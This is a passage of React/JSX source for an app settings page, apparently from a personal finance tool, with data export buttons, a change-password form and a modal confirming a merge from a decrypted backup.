                  className="justify-center gap-1.5"
                  disabled={exportLoading}
                >
                  <FileSpreadsheet className="h-4 w-4 shrink-0" /> Export CSV
                </Button>
                <Button
                  onClick={() => handlePlainExport('json')}
                  variant="secondary"
                  className="justify-center gap-1.5"
                  disabled={exportLoading}
                >
                  <FileJson className="h-4 w-4 shrink-0" /> Export JSON
                </Button>
              </div>
            </Card>
            {/* Change Password Card */}
            <Card className="border-border-subtle bg-surface-1 shadow-md">
              <h2 className="text-base font-bold text-zinc-100 mb-1.5 flex items-center gap-2">
                <Key className="h-5 w-5 text-brand-400 shrink-0" />
                <span>Change Account Password</span>
              </h2>
              <p className="text-sm text-zinc-400 mb-2 leading-relaxed">
                Update your account password. Passwords must be at least 6 characters.
              </p>
              <p className="text-sm text-zinc-500 mb-5 leading-relaxed">
                Forgotten it entirely? Use “Reset My Password” on your Profile page instead —
                it emails you a reset link.
              </p>
              <form onSubmit={handleChangePassword} className="space-y-3">
                {changePasswordError && (
                  <div role="alert" className="rounded-xl bg-[var(--status-danger-subtle)] border border-[var(--status-danger-border)] p-3 text-sm text-[var(--status-danger-text)] leading-relaxed flex items-start gap-2">
                    <XCircle className="h-4 w-4 shrink-0 mt-0.5 text-[var(--status-danger-text)]" />
                    <span>{changePasswordError}</span>
                  </div>
                )}
                {changePasswordSuccess && (
                  <div className="rounded-xl bg-[var(--status-positive-subtle)] border border-[var(--status-positive-border)] p-3 text-sm text-[var(--status-positive-text)] leading-relaxed flex items-start gap-2">
                    <CheckCircle2 className="h-4 w-4 shrink-0 mt-0.5 text-[var(--status-positive-text)]" />
                    <span>Password updated successfully!</span>
                  </div>
                )}
                <Input
                  label="New Password"
                  type="password"
                  placeholder="Enter new password"
                  value={newPassword}
                  onChange={(e) => setNewPassword(e.target.value)}
                  required
                  disabled={changePasswordLoading}
                />
                <Input
                  label="Confirm New Password"
                  type="password"
                  placeholder="Confirm new password"
                  value={confirmPassword}
                  onChange={(e) => setConfirmPassword(e.target.value)}
                  required
                  disabled={changePasswordLoading}
                />
                <Button type="submit" block loading={changePasswordLoading} disabled={changePasswordLoading} className="gap-1.5">
                  <Check className="h-4 w-4" /> Update Password
                </Button>
              </form>
            </Card>
            </>
          )}
              </motion.div>
            </AnimatePresence>
          </div>
        </div>
      </div>

      {/* Restore Confirmation Modal */}
      <Modal
        isOpen={showRestoreConfirmModal}
        onClose={() => {
          setShowRestoreConfirmModal(false)
          setPendingRestoreData(null)
        }}
        title="Confirm Backup Restore"
        footer={
          <>
            <Button
              variant="secondary"
              onClick={() => {
                setShowRestoreConfirmModal(false)
                setPendingRestoreData(null)
              }}
            >
              Cancel
            </Button>
            <Button onClick={executeRestore}>
              Merge & Restore
            </Button>
          </>
        }
      >
        <div className="flex items-start gap-3">
          <HelpCircle className="h-5 w-5 text-brand-400 shrink-0 mt-0.5" />
          <p className="text-sm text-text-secondary leading-relaxed">
            Decrypted backup successfully containing {pendingRestoreData?.length || 0} transactions. Would you like to merge these with your current data? (Only non-duplicate transactions will be added)
          </p>
        </div>
      </Modal>
    </AppLayout>
  )
}
